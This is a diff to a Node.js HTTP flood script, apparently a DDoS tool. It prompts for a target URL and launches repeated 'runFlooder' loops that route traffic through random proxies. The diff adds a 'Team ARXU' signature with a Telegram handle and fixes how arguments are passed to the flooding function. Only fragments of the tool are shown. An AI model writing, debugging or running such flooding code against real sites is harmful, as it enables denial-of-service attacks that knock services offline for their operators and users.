@@ -1,3 +1,5 @@
+//Made by admin of Team ARXU.... Telegram: @A0R3A
+
 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
@@ -164,7 +166,7 @@ rl.question("Enter the target URL: ", (target) => {
                     }
                 } else {
                     for (let i = 0; i < 10; i++) {
-                        setInterval(runFlooder, 0)
+                        setInterval(() => runFlooder(args, proxies, parsedTarget), 0)
                     }
                 }
             });
@@ -240,7 +242,7 @@ function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 
-function runFlooder() {
+function runFlooder(args, proxies, parsedTarget) {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80"
